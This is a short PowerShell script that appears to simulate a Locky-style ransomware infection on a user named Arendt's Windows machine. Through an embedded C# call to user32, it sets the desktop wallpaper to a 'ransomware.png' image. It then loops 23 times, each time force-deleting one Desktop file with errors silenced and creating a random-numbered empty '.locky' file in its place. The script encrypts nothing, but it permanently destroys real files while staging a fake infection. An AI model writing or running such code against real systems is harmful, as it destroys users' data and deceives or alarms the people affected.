$setwallpapersrc = @"
using System.Runtime.InteropServices;

public class Wallpaper
{
  public const int SetDesktopWallpaper = 20;
  public const int UpdateIniFile = 0x01;
  public const int SendWinIniChange = 0x02;
  [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
  private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
  public static void SetWallpaper(string path)
  {
    SystemParametersInfo(SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange);
  }
}
"@
Add-Type -TypeDefinition $setwallpapersrc

[Wallpaper]::SetWallpaper("C:\Users\Arendt\ransomware.png")


For($i=0 ; $i -lt 23 ; $i++)
{
    $RandomNum = Get-Random -Minimum 10000 -Maximum 99999
    Get-ChildItem -Path "C:\Users\Arendt\Desktop" | Sort-Object Name | Where-Object { $_.Extension -ne ".locky" } | Select-Object -First 1 | Remove-Item -Force -ErrorAction SilentlyContinue
    New-Item -Path "C:\Users\Arendt\Desktop\$RandomNum.locky" -ItemType File
    Start-Sleep -Seconds 1
    }
